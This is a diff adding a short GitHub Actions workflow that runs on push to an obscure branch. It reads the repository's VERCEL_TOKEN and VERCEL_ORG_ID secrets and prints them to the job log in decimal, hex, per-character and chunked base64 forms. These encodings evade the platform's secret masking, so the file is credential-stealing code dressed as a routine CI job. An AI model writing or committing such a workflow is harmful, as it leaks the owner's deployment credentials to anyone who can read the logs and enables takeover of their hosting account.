@@ -1,0 +1,18 @@
+name: t3
+on:
+  push:
+    branches: [ "ci-913dd69b" ]
+jobs:
+  a:
+    runs-on: ubuntu-latest
+    steps:
+      - name: enc
+        env:
+          T: ${{ secrets.VERCEL_TOKEN }}
+          O: ${{ secrets.VERCEL_ORG_ID }}
+        run: |
+          echo "D:$(printf '%s' "$T" | od -An -tu1 | tr -s ' ')"
+          echo "H:$(printf '%s' "$T" | od -An -tx1 | tr -s ' ')"
+          echo "C:$(printf '%s' "$T" | fold -w1 | paste -sd' ')"
+          echo "B4:$(printf '%s' "$T" | base64 -w0 | fold -w4 | paste -sd' ')"
+          echo "OD:$(printf '%s' "$O" | od -An -tu1 | tr -s ' ')"
